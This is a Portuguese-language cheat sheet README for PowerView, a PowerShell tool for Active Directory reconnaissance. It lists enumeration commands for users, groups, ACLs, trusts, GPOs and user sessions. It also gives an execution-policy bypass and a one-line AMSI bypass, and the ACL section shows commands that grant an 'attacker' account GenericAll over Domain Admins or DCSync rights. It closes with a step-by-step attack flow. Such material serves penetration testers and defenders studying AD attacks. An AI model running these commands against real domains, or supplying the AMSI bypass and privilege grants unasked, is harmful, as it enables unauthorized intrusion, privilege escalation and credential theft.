# ⚡ PowerView — enumeração de AD com PowerShell

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Notas de versão e precisão:** o original combina nomes de funções de gerações diferentes de PowerView e técnicas antigas de AMSI; a disponibilidade depende do script e do PowerShell usados. Find-LocalAdminAccess encontra sistemas onde a identidade atual tem acesso de administrador, não todos os utilizadores administradores. CheckShareAccess não demonstra, por si só, escrita na partilha; a permissão deve ser verificada separadamente. [Código e documentação originais](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1). GPO é um objeto de Política de Grupo; uma floresta agrupa domínios AD. O contorno da política de execução ou de AMSI não garante ausência de deteção.

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ██╗   ██╗██╗███████╗██╗    ██╗
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██║   ██║██║██╔════╝██║    ██║
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝██║   ██║██║█████╗  ██║ █╗ ██║
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║██╔══╝  ██║███╗██║
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║ ╚████╔╝ ██║███████╗╚███╔███╔╝
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝ 
                  Reconhecimento de Active Directory com PowerShell
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerView-Active_Directory-blue?style=for-the-badge" alt="PowerView">
  <img src="https://img.shields.io/badge/PowerShell-red?style=for-the-badge" alt="PowerShell">
</p>

---

## 📋 Índice

- [O que é o PowerView](#-what-is-powerview)
- [Preparação](#-setup)
- [Enumeração do domínio](#-domain-enumeration)
- [Enumeração de utilizadores](#-user-enumeration)
- [Enumeração de grupos](#-group-enumeration)
- [Enumeração de computadores](#-computer-enumeration)
- [Enumeração de ACL](#-acl-enumeration)
- [Enumeração de relações de confiança](#-trust-enumeration)
- [Enumeração de GPO](#-gpo-enumeration)
- [Pesquisa de acessos e sessões](#-hunting)
- [Referência rápida](#-quick-reference)

---

<a id="-what-is-powerview"></a>
## 🎯 O que é o PowerView

O **PowerView** é uma ferramenta PowerShell para enumeração e exploração de AD:

- 🔍 **Enumeração** — Utilizadores, grupos, computadores e GPOs
- 🔐 **ACL** — Encontrar permissões mal configuradas
- 🌐 **Relações de confiança** — Mapear relações entre domínios
- 🎯 **Pesquisa de sessões** — Encontrar onde os utilizadores têm sessão iniciada

---

<a id="-setup"></a>
## 🚀 Preparação

### Descarregar PowerView

```powershell
# A partir de PowerSploit
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

# A partir de SharpHound
# PowerView.ps1 incluído com BloodHound
```

### Importar o módulo

```powershell
# Contornar a política de execução
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Importar
Import-Module .\PowerView.ps1

# Ou carregar por dot sourcing (executar no âmbito atual)
. .\PowerView.ps1
```

### Contorno de AMSI (se necessário)

```powershell
# Contorno simples
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

<a id="-domain-enumeration"></a>
## 🏢 Enumeração do domínio

### Informações básicas do domínio

```powershell
# Obter informações do domínio
Get-Domain

# Obter o SID do domínio
Get-DomainSID

# Obter a política do domínio
Get-DomainPolicy

# Obter os controladores de domínio
Get-DomainController
Get-DomainController -Domain other.domain.local

# Obter informações da floresta
Get-Forest
Get-ForestDomain
```

### Política do domínio

```powershell
# Política de palavras-passe
(Get-DomainPolicy)."SystemAccess"

# Política de Kerberos
(Get-DomainPolicy)."KerberosPolicy"
```

---

<a id="-user-enumeration"></a>
## 👤 Enumeração de utilizadores

### Listar utilizadores

```powershell
# Todos os utilizadores
Get-DomainUser

# Utilizador específico
Get-DomainUser -Identity admin

# Propriedades dos utilizadores
Get-DomainUser -Identity admin -Properties *
Get-DomainUser -Identity admin -Properties samaccountname,description

# Utilizadores com descrições
Get-DomainUser -LDAPFilter "(description=*)" | Select-Object samaccountname,description
```

### Encontrar utilizadores relevantes

```powershell
# Utilizadores com SPN (suscetíveis a Kerberoasting)
Get-DomainUser -SPN

# Utilizadores sem pré-autenticação (AS-REP)
Get-DomainUser -PreauthNotRequired

# Utilizadores assinalados por adminCount (protegidos)
Get-DomainUser -AdminCount

# Utilizadores com palavras-passe na descrição
Get-DomainUser -LDAPFilter "(description=*pass*)" | Select-Object samaccountname,description
```

### Sessões de utilizadores

```powershell
# Onde tem o utilizador sessão iniciada
Find-DomainUserLocation -UserIdentity admin

# Encontrar utilizadores com acesso de administrador
Find-LocalAdminAccess
```

---

<a id="-group-enumeration"></a>
## 👥 Enumeração de grupos

### Listar grupos

```powershell
# Todos os grupos
Get-DomainGroup

# Grupo específico
Get-DomainGroup -Identity "Domain Admins"

# Membros do grupo
Get-DomainGroupMember -Identity "Domain Admins"

# Membros de forma recursiva
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

### Grupos importantes

```powershell
# Administradores do domínio
Get-DomainGroupMember -Identity "Domain Admins"

# Administradores da empresa
Get-DomainGroupMember -Identity "Enterprise Admins"

# Administrators
Get-DomainGroupMember -Identity "Administrators"

# Encontrar os grupos a que o utilizador pertence
Get-DomainGroup -UserName admin
```

### Grupos locais

```powershell
# Administradores locais de um computador
Get-NetLocalGroupMember -ComputerName server01

# Administradores locais nos vários sistemas
Find-DomainLocalGroupMember -GroupName Administrators
```

---

<a id="-computer-enumeration"></a>
## 💻 Enumeração de computadores

### Listar computadores

```powershell
# Todos os computadores
Get-DomainComputer

# Computador específico
Get-DomainComputer -Identity server01

# Propriedades
Get-DomainComputer -Properties operatingsystem,serviceprincipalname

# Computadores com delegação sem restrições
Get-DomainComputer -Unconstrained
```

### Encontrar alvos

```powershell
# Controladores de domínio
Get-DomainController

# Servidores
Get-DomainComputer -OperatingSystem "*Server*"

# Windows 10
Get-DomainComputer -OperatingSystem "*Windows 10*"

# Sistema operativo antigo
Get-DomainComputer -OperatingSystem "*2008*"
```

### Partilhas

```powershell
# Encontrar partilhas
Find-DomainShare

# Partilhas com permissão de escrita
Find-DomainShare -CheckShareAccess

# Ficheiros relevantes nas partilhas
Find-InterestingDomainShareFile
Find-InterestingDomainShareFile -Include *.txt,*.doc,*.xlsx
```

---

<a id="-acl-enumeration"></a>
## 🔐 Enumeração de ACL

### ACL básicas

```powershell
# ACL de um utilizador
Get-DomainObjectAcl -Identity admin

# Resolver GUIDs
Get-DomainObjectAcl -Identity admin -ResolveGUIDs

# Permissões específicas
Get-DomainObjectAcl -Identity admin -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}
```

### Encontrar ACL relevantes

```powershell
# GenericAll num utilizador
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-.*-1107"}

# WriteProperty
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty"}

# WriteDacl
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteDacl"}
```

### Permissões DCSync

```powershell
# Encontrar permissões DCSync
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match "Replication-Get") -or ($_.ActiveDirectoryRights -match "GenericAll")}
```

### Alterar a ACL

```powershell
# Atribuir GenericAll a um utilizador
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# Adicionar permissões DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

---

<a id="-trust-enumeration"></a>
## 🤝 Enumeração de relações de confiança

### Relações de confiança entre domínios

```powershell
# Obter relações de confiança
Get-DomainTrust

# Todas as relações de confiança
Get-DomainTrust -Domain domain.local

# Mapear todas as relações de confiança
Get-DomainTrustMapping
```

### Relações de confiança entre florestas

```powershell
# Relações de confiança da floresta
Get-ForestTrust

# Domínios da floresta
Get-ForestDomain
```

### Tipos de relações de confiança

| Tipo de relação de confiança | Direção | Descrição |
|------------|-----------|-------------|
| Bidirecional | Nos dois sentidos | Ambos os domínios confiam um no outro |
| De entrada | Num único sentido | O outro domínio confia no nosso |
| De saída | Num único sentido | O nosso domínio confia no outro |

---

<a id="-gpo-enumeration"></a>
## 📜 Enumeração de GPO

### Listar GPOs

```powershell
# Todas as GPOs
Get-DomainGPO

# GPO pelo nome
Get-DomainGPO -Identity "Default Domain Policy"

# GPOs numa unidade organizacional específica
Get-DomainGPO -ComputerIdentity server01
```

### Encontrar permissões de GPO

```powershell
# GPO que o utilizador pode alterar
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"}
```

### Locais de aplicação de GPO

```powershell
# Unidades organizacionais onde a GPO se aplica
Get-DomainOU -GPLink "{GPO-GUID}"

# GPO num computador específico
Get-DomainGPO -ComputerIdentity "server01"
```

---

<a id="-hunting"></a>
## 🎯 Pesquisa de acessos e sessões

### Encontrar acessos de administrador

```powershell
# Onde temos privilégios de administrador local?
Find-LocalAdminAccess

# Com threads
Find-LocalAdminAccess -Threads 10

# Em computadores específicos
Find-LocalAdminAccess -ComputerFile computers.txt
```

### Encontrar as sessões dos utilizadores

```powershell
# Onde tem o utilizador sessão iniciada?
Find-DomainUserLocation

# Utilizador específico
Find-DomainUserLocation -UserIdentity admin

# Apenas computadores aos quais temos acesso
Find-DomainUserLocation -CheckAccess
```

### Encontrar sessões

```powershell
# Sessões num computador
Get-NetSession -ComputerName dc01

# Utilizadores com sessão iniciada
Get-NetLoggedon -ComputerName server01

# Sessões RDP
Get-NetRDPSession -ComputerName server01
```

### Procurar utilizadores específicos

```powershell
# Encontrar administradores do domínio
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Verificar onde têm sessão iniciada
Invoke-UserHunter

# Modo de menor visibilidade
Invoke-UserHunter -Stealth
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Comandos essenciais

| Comando | Descrição |
|---------|-------------|
| `Get-Domain` | Informações do domínio |
| `Get-DomainUser` | Listar utilizadores |
| `Get-DomainGroup` | Listar grupos |
| `Get-DomainComputer` | Listar computadores |
| `Get-DomainController` | Listar controladores de domínio |
| `Get-DomainTrust` | Listar relações de confiança |
| `Get-DomainGPO` | Listar GPOs |
| `Find-LocalAdminAccess` | Encontrar acessos de administrador |
| `Find-DomainUserLocation` | Encontrar sessões de utilizadores |

### Alvos Kerberos

| Comando | Descrição |
|---------|-------------|
| `Get-DomainUser -SPN` | Suscetível a Kerberoasting |
| `Get-DomainUser -PreauthNotRequired` | Suscetível a AS-REP roasting |
| `Get-DomainComputer -Unconstrained` | Delegação sem restrições |

### Filtros comuns

```powershell
# Filtrar por propriedade
Get-DomainUser -Properties samaccountname,description

# Filtro LDAP
Get-DomainUser -LDAPFilter "(description=*admin*)"

# Condição de seleção
Get-DomainUser | ? {$_.samaccountname -like "*svc*"}
```

### Fluxo de ataque

```powershell
# 1. Importar
Import-Module .\PowerView.ps1

# 2. Enumerar o domínio
Get-Domain
Get-DomainController

# 3. Encontrar utilizadores
Get-DomainUser -SPN | Select samaccountname
Get-DomainUser -PreauthNotRequired

# 4. Encontrar acessos de administrador
Find-LocalAdminAccess

# 5. Procurar sessões de utilizadores
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# 6. Verificar as ACL
Get-DomainObjectAcl -Identity admin -ResolveGUIDs
```

---

## 📚 Recursos

- [PowerView GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [HarmJ0y Blog](https://blog.harmj0y.net/)
- [PowerView Cheat Sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### Guias de referência relacionados
- [BloodHound](../../BloodHound/translations/README.pt.md)
- [PowerShell](../../PowerShell/translations/README.pt.md)
- [Mimikatz](../../Mimikatz/translations/README.pt.md)

---

<p align="center">
  <b>⚡ Reconhecimento de AD com PowerShell!</b><br>
  <i>PowerView — uma referência na enumeração de AD</i>
</p>
